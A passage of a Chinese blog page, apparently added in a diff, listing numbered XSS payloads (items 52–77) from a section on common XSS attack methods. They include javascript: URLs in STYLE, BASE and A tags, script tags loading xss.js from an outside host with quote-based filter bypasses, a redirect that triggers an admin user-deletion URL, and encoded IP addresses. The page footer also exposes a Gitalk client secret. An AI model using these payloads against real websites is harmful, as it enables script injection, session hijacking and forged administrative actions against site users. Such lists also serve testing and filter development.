+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;STYLE&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);&#125;&lt;&#x2F;STYLE&gt;&lt;A</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CLASS&#x3D;XSS&gt;&lt;&#x2F;A&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(52)IMG STYLE方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exppression(alert(&quot;XSS&quot;))&#39;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(53)STYLE background</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;STYLE&gt;&lt;STYLE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">type&#x3D;&quot;text&#x2F;css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)&#125;&lt;&#x2F;STYLE&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(54)BASE</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BASE HREF&#x3D;&quot;javascript:alert(&#39;XSS&#39;);&#x2F;&#x2F;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;EMBED SRC&#x3D;&quot;http:&#x2F;&#x2F;3w.org&#x2F;XSS&#x2F;xss.swf&quot; &gt;&lt;&#x2F;EMBED&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(56)在flash中使用ActionScrpt可以混进你XSS的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&quot;get&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b&#x3D;&quot;URL(\&quot;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c&#x3D;&quot;javascript:&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d&#x3D;&quot;alert(&#39;XSS&#39;);\&quot;)&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eval_r(a+b+c+d);</span><br></pre></td></tr></table></figure>
+
+<p>(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML xmlns:xss&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?import namespace&#x3D;&quot;xss&quot; implementation&#x3D;&quot;http:&#x2F;&#x2F;3w.org&#x2F;XSS&#x2F;xss.htc&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;xss:xss&gt;XSS&lt;&#x2F;xss:xss&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(58)如果过滤了你的JS你可以在图片里添加JS代码来利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT SRC&#x3D;&quot;&quot;&gt;&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(59)IMG嵌入式命令,可执行任意命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;&quot;http:&#x2F;&#x2F;www.a.com&#x2F;a.php?a&#x3D;b&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(60)IMG嵌入式命令(a.jpg在同服务器)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redirect 302 &#x2F;a.jpg http:&#x2F;&#x2F;www.XXX.com&#x2F;admin.asp&amp;deleteuser</span><br></pre></td></tr></table></figure>
+
+<p>(61)绕符号过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT a&#x3D;&quot;&gt;&quot; SRC&#x3D;&quot;http:&#x2F;&#x2F;3w.org&#x2F;xss.js&quot;&gt;&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(62)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT &#x3D;&quot;&gt;&quot; SRC&#x3D;&quot;http:&#x2F;&#x2F;3w.org&#x2F;xss.js&quot;&gt;&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(63)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT a&#x3D;&quot;&gt;&quot; &quot; SRC&#x3D;&quot;http:&#x2F;&#x2F;3w.org&#x2F;xss.js&quot;&gt;&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(64)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT &quot;a&#x3D;&#39;&gt;&#39;&quot; SRC&#x3D;&quot;http:&#x2F;&#x2F;3w.org&#x2F;xss.js&quot;&gt;&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(65)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT a&#x3D;&#96;&gt;&#96; SRC&#x3D;&quot;http:&#x2F;&#x2F;3w.org&#x2F;xss.js&quot;&gt;&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(66)12-7-1 T00LS - Powered by Discuz! Board</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.a.com&#x2F;viewthread.php?action&#x3D;printable&amp;tid&#x3D;15267 4&#x2F;6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;SCRIPT a&#x3D;&quot;&gt;&#39;&gt;&quot; SRC&#x3D;&quot;http:&#x2F;&#x2F;3w.org&#x2F;xss.js&quot;&gt;&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(67)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;&#x2F;SCRIPT&gt;PT SRC&#x3D;&quot;http:&#x2F;&#x2F;3w.org&#x2F;xss.js&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(68)URL绕行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;&quot;&gt;XSS&lt;&#x2F;A&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(69)URL编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF&#x3D;&quot;http:&#x2F;&#x2F;3w.org&quot;&gt;XSS&lt;&#x2F;A&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(70)IP十进制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF&#x3D;&quot;http:&#x2F;&#x2F;3232235521″&gt;XSS&lt;&#x2F;A&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(71)IP十六进制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF&#x3D;&quot;http:&#x2F;&#x2F;0xc0.0xa8.0×00.0×01″&gt;XSS&lt;&#x2F;A&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(72)IP八进制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF&#x3D;&quot;http:&#x2F;&#x2F;0300.0250.0000.0001″&gt;XSS&lt;&#x2F;A&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(73)混合编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF&#x3D;&quot;http:&#x2F;&#x2F;6 6.000146.0×7.147&#x2F;&quot;&quot;&gt;XSS&lt;&#x2F;A&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(74)节省[http:]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF&#x3D;&quot;&#x2F;&#x2F;www.google.com&#x2F;&quot;&gt;XSS&lt;&#x2F;A&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(75)节省[www]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF&#x3D;&quot;http:&#x2F;&#x2F;google.com&#x2F;&quot;&gt;XSS&lt;&#x2F;A&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(76)绝对点绝对<a href="https://lvtao.net/tag/DNS/" target="_blank" rel="noopener">DNS</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF&#x3D;&quot;http:&#x2F;&#x2F;www.google.com.&#x2F;&quot;&gt;XSS&lt;&#x2F;A&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(77)javascript链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF&#x3D;&quot;javascript:document.location&#x3D;&#39;http:&#x2F;&#x2F;www.google.com&#x2F;&#39;&quot;&gt;XSS&lt;&#x2F;A&gt;</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='true'
+        data-ci='2b954438d2f5ca9e36a0'
+        data-cs='e36607cd1943678e41a7095a67641166a303ec4e'
+        data-r='guoyanan1g.github.io'
+        data-o='guoyanan1g'
+        data-a='guoyanan1g'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS简介"><span class="toc-number">1.</span> <span class="toc-text">XSS简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS分类"><span class="toc-number">2.</span> <span class="toc-text">XSS分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS辅助工具——BeEF"><span class="toc-number">3.</span> <span class="toc-text">XSS辅助工具——BeEF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS的实际利用"><span class="toc-number">4.</span> <span class="toc-text">XSS的实际利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常见的XSS攻击方法"><span class="toc-number">4.1.</span> <span class="toc-text">常见的XSS攻击方法</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
